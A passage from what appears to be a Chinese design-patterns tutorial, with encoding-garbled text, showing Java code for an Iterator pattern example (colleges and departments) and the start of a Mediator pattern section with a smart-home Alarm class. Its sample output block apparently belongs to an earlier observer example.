TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;è®¡ç®—æœºå­¦é™¢&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Department</span> <span class="hljs-variable">department</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(name, desc);<br>      departments[numOfDepartment] = department;<br>      numOfDepartment += <span class="hljs-number">1</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Iterator <span class="hljs-title function_">createIterator</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComputerCollegeIterator</span>(departments);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ComputerCollegeIterator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputerCollegeIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterator</span> &#123;<br><br>   <span class="hljs-comment">//è¿™é‡Œæˆ‘ä»¬éœ€è¦Department æ˜¯ä»¥æ€æ ·çš„æ–¹å¼å­˜æ”¾=&gt;æ•°ç»„</span><br>   Department[] departments;<br>   <span class="hljs-type">int</span> <span class="hljs-variable">position</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//éå†çš„ä½ç½®</span><br>   <br>   <br>   <br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ComputerCollegeIterator</span><span class="hljs-params">(Department[] departments)</span> &#123;<br>      <span class="hljs-built_in">this</span>.departments = departments;<br>   &#125;<br><br>   <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦è¿˜æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ </span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">if</span>(position &gt;= departments.length || departments[position] == <span class="hljs-literal">null</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125;<span class="hljs-keyword">else</span> &#123;<br>      <br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Department</span> <span class="hljs-variable">department</span> <span class="hljs-operator">=</span> departments[position];<br>      position += <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">return</span> department;<br>   &#125;<br>   <br>   <span class="hljs-comment">//åˆ é™¤çš„æ–¹æ³•ï¼Œé»˜è®¤ç©ºå®ç°</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">()</span> &#123;<br>      <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Department.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-comment">//ç³»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Department</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String desc;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Department</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.desc = desc;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDesc</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> desc;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDesc</span><span class="hljs-params">(String desc)</span> &#123;<br>        <span class="hljs-built_in">this</span>.desc = desc;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>InfoColleageIterator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InfoColleageIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterator</span> &#123;<br><br><br>    List&lt;Department&gt; departmentList; <span class="hljs-comment">// ä¿¡æ¯å·¥ç¨‹å­¦é™¢æ˜¯ä»¥Listæ–¹å¼å­˜æ”¾ç³»</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<span class="hljs-comment">//ç´¢å¼•</span><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InfoColleageIterator</span><span class="hljs-params">(List&lt;Department&gt; departmentList)</span> &#123;<br>        <span class="hljs-built_in">this</span>.departmentList = departmentList;<br>    &#125;<br><br>    <span class="hljs-comment">//åˆ¤æ–­listä¸­è¿˜æœ‰æ²¡æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ </span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-keyword">if</span> (index &gt;= departmentList.size() - <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            index += <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-keyword">return</span> departmentList.get(index);<br>    &#125;<br><br>    <span class="hljs-comment">//ç©ºå®ç°remove</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>InfoCollege.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InfoCollege</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">College</span> &#123;<br><br>   List&lt;Department&gt; departmentList;<br>   <br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">InfoCollege</span><span class="hljs-params">()</span> &#123;<br>      departmentList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Department&gt;();<br>      addDepartment(<span class="hljs-string">&quot;ä¿¡æ¯å®‰å…¨ä¸“ä¸š&quot;</span>, <span class="hljs-string">&quot; ä¿¡æ¯å®‰å…¨ä¸“ä¸š &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;ç½‘ç»œå®‰å…¨ä¸“ä¸š&quot;</span>, <span class="hljs-string">&quot; ç½‘ç»œå®‰å…¨ä¸“ä¸š &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;æœåŠ¡å™¨å®‰å…¨ä¸“ä¸š&quot;</span>, <span class="hljs-string">&quot; æœåŠ¡å™¨å®‰å…¨ä¸“ä¸š &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ä¿¡æ¯å·¥ç¨‹å­¦é™¢&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Department</span> <span class="hljs-variable">department</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(name, desc);<br>      departmentList.add(department);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Iterator <span class="hljs-title function_">createIterator</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InfoColleageIterator</span>(departmentList);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>OutPutImpl.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OutPutImpl</span> &#123;<br>   <br>   <span class="hljs-comment">//å­¦é™¢é›†åˆ</span><br>   List&lt;College&gt; collegeList;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">OutPutImpl</span><span class="hljs-params">(List&lt;College&gt; collegeList)</span> &#123;<br>      <br>      <span class="hljs-built_in">this</span>.collegeList = collegeList;<br>   &#125;<br>   <span class="hljs-comment">//éå†æ‰€æœ‰å­¦é™¢,ç„¶åè°ƒç”¨printDepartment è¾“å‡ºå„ä¸ªå­¦é™¢çš„ç³»</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printCollege</span><span class="hljs-params">()</span> &#123;<br>      <br>      <span class="hljs-comment">//ä»collegeList å–å‡ºæ‰€æœ‰å­¦é™¢, Java ä¸­çš„ List å·²ç»å®ç°Iterator</span><br>      Iterator&lt;College&gt; iterator = collegeList.iterator();<br>      <br>      <span class="hljs-keyword">while</span>(iterator.hasNext()) &#123;<br>         <span class="hljs-comment">//å–å‡ºä¸€ä¸ªå­¦é™¢</span><br>         <span class="hljs-type">College</span> <span class="hljs-variable">college</span> <span class="hljs-operator">=</span> iterator.next();<br>         System.out.println(<span class="hljs-string">&quot;=== &quot;</span>+college.getName() +<span class="hljs-string">&quot;=====&quot;</span> );<br>         printDepartment(college.createIterator()); <span class="hljs-comment">//å¾—åˆ°å¯¹åº”è¿­ä»£å™¨</span><br>      &#125;<br>   &#125;<br>   <br>   <br>   <span class="hljs-comment">//è¾“å‡º å­¦é™¢è¾“å‡º ç³»</span><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printDepartment</span><span class="hljs-params">(Iterator iterator)</span> &#123;<br>      <span class="hljs-keyword">while</span>(iterator.hasNext()) &#123;<br>         <span class="hljs-type">Department</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> (Department)iterator.next();<br>         System.out.println(d.getName());<br>      &#125;<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">é€šçŸ¥å„ä¸ªæ³¨å†Œçš„è§‚å¯Ÿè€…, çœ‹çœ‹ä¿¡æ¯<br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mTemperature: 10.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mPressure: 100.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mHumidity: 30.3*</span>**</span><br>===ç™¾åº¦ç½‘ç«™====<br><span class="hljs-strong">**<span class="hljs-emphasis">*ç™¾åº¦ç½‘ç«™ æ°”æ¸© : 10.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*ç™¾åº¦ç½‘ç«™ æ°”å‹: 100.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*ç™¾åº¦ç½‘ç«™ æ¹¿åº¦: 30.3*</span>**</span><br><br>é€šçŸ¥å„ä¸ªæ³¨å†Œçš„è§‚å¯Ÿè€…, çœ‹çœ‹ä¿¡æ¯<br>===ç™¾åº¦ç½‘ç«™====<br><span class="hljs-strong">**<span class="hljs-emphasis">*ç™¾åº¦ç½‘ç«™ æ°”æ¸© : 10.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*ç™¾åº¦ç½‘ç«™ æ°”å‹: 100.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*ç™¾åº¦ç½‘ç«™ æ¹¿åº¦: 30.3*</span>**</span><br></code></pre></td></tr></table></figure><h1 id="ä¸­ä»‹è€…æ¨¡å¼"><a class="markdownIt-Anchor" href="#ä¸­ä»‹è€…æ¨¡å¼"></a> ä¸­ä»‹è€…æ¨¡å¼</h1><p>ä¸­ä»‹è€…æ¨¡å¼ï¼ˆMediator Patternï¼‰æ˜¯ç”¨æ¥é™ä½å¤šä¸ªå¯¹è±¡å’Œç±»ä¹‹é—´çš„é€šä¿¡å¤æ‚æ€§ã€‚è¿™ç§æ¨¡å¼æä¾›äº†ä¸€ä¸ªä¸­ä»‹ç±»ï¼Œè¯¥ç±»é€šå¸¸å¤„ç†ä¸åŒç±»ä¹‹é—´çš„é€šä¿¡ï¼Œå¹¶æ”¯æŒæ¾è€¦åˆï¼Œä½¿ä»£ç æ˜“äºç»´æŠ¤ã€‚ä¸­ä»‹è€…æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚</p><h2 id="ä»‹ç»-17"><a class="markdownIt-Anchor" href="#ä»‹ç»-17"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> ç”¨ä¸€ä¸ªä¸­ä»‹å¯¹è±¡æ¥å°è£…ä¸€ç³»åˆ—çš„å¯¹è±¡äº¤äº’ï¼Œä¸­ä»‹è€…ä½¿å„å¯¹è±¡ä¸éœ€è¦æ˜¾å¼åœ°ç›¸äº’å¼•ç”¨ï¼Œä»è€Œä½¿å…¶è€¦åˆæ¾æ•£ï¼Œè€Œä¸”å¯ä»¥ç‹¬ç«‹åœ°æ”¹å˜å®ƒä»¬ä¹‹é—´çš„äº¤äº’ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong><br />å¯¹è±¡ä¸å¯¹è±¡ä¹‹é—´å­˜åœ¨å¤§é‡çš„å…³è”å…³ç³»ï¼Œè¿™æ ·åŠ¿å¿…ä¼šå¯¼è‡´ç³»ç»Ÿçš„ç»“æ„å˜å¾—å¾ˆå¤æ‚ï¼ŒåŒæ—¶è‹¥ä¸€ä¸ªå¯¹è±¡å‘ç”Ÿæ”¹å˜ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦è·Ÿè¸ªä¸ä¹‹ç›¸å…³è”çš„å¯¹è±¡ï¼ŒåŒæ—¶åšå‡ºç›¸åº”çš„å¤„ç†ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> å¤šä¸ªç±»ç›¸äº’è€¦åˆï¼Œå½¢æˆäº†ç½‘çŠ¶ç»“æ„ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> å°†ä¸Šè¿°ç½‘çŠ¶ç»“æ„åˆ†ç¦»ä¸ºæ˜Ÿå‹ç»“æ„ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> å¯¹è±¡ Colleague ä¹‹é—´çš„é€šä¿¡å°è£…åˆ°ä¸€ä¸ªç±»ä¸­å•ç‹¬å¤„ç†ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€ä¸­å›½åŠ å…¥ WTO ä¹‹å‰æ˜¯å„ä¸ªå›½å®¶ç›¸äº’è´¸æ˜“ï¼Œç»“æ„å¤æ‚ï¼Œç°åœ¨æ˜¯å„ä¸ªå›½å®¶é€šè¿‡ WTO æ¥äº’ç›¸è´¸æ˜“ã€‚ 2ã€æœºåœºè°ƒåº¦ç³»ç»Ÿã€‚ 3ã€MVC æ¡†æ¶ï¼Œå…¶ä¸­Cï¼ˆæ§åˆ¶å™¨ï¼‰å°±æ˜¯ Mï¼ˆæ¨¡å‹ï¼‰å’Œ Vï¼ˆè§†å›¾ï¼‰çš„ä¸­ä»‹è€…ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€é™ä½äº†ç±»çš„å¤æ‚åº¦ï¼Œå°†ä¸€å¯¹å¤šè½¬åŒ–æˆäº†ä¸€å¯¹ä¸€ã€‚ 2ã€å„ä¸ªç±»ä¹‹é—´çš„è§£è€¦ã€‚ 3ã€ç¬¦åˆè¿ªç±³ç‰¹åŸåˆ™ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> ä¸­ä»‹è€…ä¼šåºå¤§ï¼Œå˜å¾—å¤æ‚éš¾ä»¥ç»´æŠ¤ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€ç³»ç»Ÿä¸­å¯¹è±¡ä¹‹é—´å­˜åœ¨æ¯”è¾ƒå¤æ‚çš„å¼•ç”¨å…³ç³»ï¼Œå¯¼è‡´å®ƒä»¬ä¹‹é—´çš„ä¾èµ–å…³ç³»ç»“æ„æ··ä¹±è€Œä¸”éš¾ä»¥å¤ç”¨è¯¥å¯¹è±¡ã€‚2ã€æƒ³é€šè¿‡ä¸€ä¸ªä¸­é—´ç±»æ¥å°è£…å¤šä¸ªç±»ä¸­çš„è¡Œä¸ºï¼Œè€Œåˆä¸æƒ³ç”Ÿæˆå¤ªå¤šçš„å­ç±»ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> ä¸åº”å½“åœ¨èŒè´£æ··ä¹±çš„æ—¶å€™ä½¿ç”¨ã€‚</p><p><strong>ä¸­ä»‹è€…æ¨¡å¼çš„åŸç†ç±»å›¾:</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104145432933.png" alt="image-20230104145432933" /></p><p>å¯¹åŸç†ç±»å›¾çš„è¯´æ˜-å³(ä¸­ä»‹è€…æ¨¡å¼çš„è§’è‰²åŠèŒè´£)</p><ol><li><p>Mediator å°±æ˜¯æŠ½è±¡ä¸­ä»‹è€…,å®šä¹‰äº†åŒäº‹å¯¹è±¡åˆ°ä¸­ä»‹è€…å¯¹è±¡çš„æ¥å£</p></li><li><p>Colleague æ˜¯æŠ½è±¡åŒäº‹ç±»</p></li><li><p>ConcreteMediator å…·ä½“çš„ä¸­ä»‹è€…å¯¹è±¡, å®ç°æŠ½è±¡æ–¹æ³•, ä»–éœ€è¦çŸ¥é“æ‰€æœ‰çš„å…·ä½“çš„åŒäº‹ç±»,å³ä»¥ä¸€ä¸ªé›†åˆæ¥ç®¡ç†HashMap,å¹¶æ¥å—æŸä¸ªåŒäº‹å¯¹è±¡æ¶ˆæ¯ï¼Œå®Œæˆç›¸åº”çš„ä»»åŠ¡</p></li><li><p>ConcreteColleague å…·ä½“çš„åŒäº‹ç±»ï¼Œä¼šæœ‰å¾ˆå¤š, æ¯ä¸ªåŒäº‹åªçŸ¥é“è‡ªå·±çš„è¡Œä¸ºï¼Œè€Œä¸äº†è§£å…¶ä»–åŒäº‹ç±»çš„è¡Œä¸º(æ–¹æ³•)ï¼Œä½†æ˜¯ä»–ä»¬éƒ½ä¾èµ–ä¸­ä»‹è€…å¯¹è±¡</p></li></ol><h2 id="å®ç°-15"><a class="markdownIt-Anchor" href="#å®ç°-15"></a> å®ç°</h2><p>æ™ºèƒ½å®¶åº­é¡¹ç›®ï¼š</p><ol><li><p>æ™ºèƒ½å®¶åº­åŒ…æ‹¬å„ç§è®¾å¤‡ï¼Œé—¹é’Ÿã€å’–å•¡æœºã€ç”µè§†æœºã€çª—å¸˜ ç­‰</p></li><li><p>ä¸»äººè¦çœ‹ç”µè§†æ—¶ï¼Œå„ä¸ªè®¾å¤‡å¯ä»¥ååŒå·¥ä½œï¼Œè‡ªåŠ¨å®Œæˆçœ‹ç”µè§†çš„å‡†å¤‡å·¥ä½œï¼Œæ¯”å¦‚æµç¨‹ä¸ºï¼šé—¹é“ƒå“èµ·-&gt;å’–å•¡æœºå¼€å§‹åšå’–å•¡-&gt;çª—å¸˜è‡ªåŠ¨è½ä¸‹-&gt;ç”µè§†æœºå¼€å§‹æ’­æ”¾</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104145924536.png" alt="" /></p><p><code>Alarm.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-comment">//å…·ä½“çš„åŒäº‹ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Alarm</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Colleague</span> &#123;<br><br>   <span class="hljs-comment">//æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Alarm</span><span class="hljs-params">(Mediator mediator, String name)</span> &#123;<br>      <span class="hljs-built_in">super</span>(mediator, name);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      <span class="hljs-comment">//åœ¨åˆ›å»ºAlarm åŒäº‹å¯¹è±¡æ—¶ï¼Œå°†è‡ªå·±æ”¾å…¥åˆ°ConcreteMediator å¯¹è±¡ä¸­[é›†åˆ]</span><br>      mediator.Register(name, <span class="hljs-built_in">this</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendAlarm</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange)</span> &#123;<br>      SendMessage(stateChange);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//è°ƒç”¨çš„ä¸­ä»‹è€…å¯¹è±¡çš„getMessage</span><br>      <span class="hljs-built_in">this</span>.GetMediator().GetMessage(stateChange, <span class="hljs-built_in">this</span>.name);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ClientTest.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 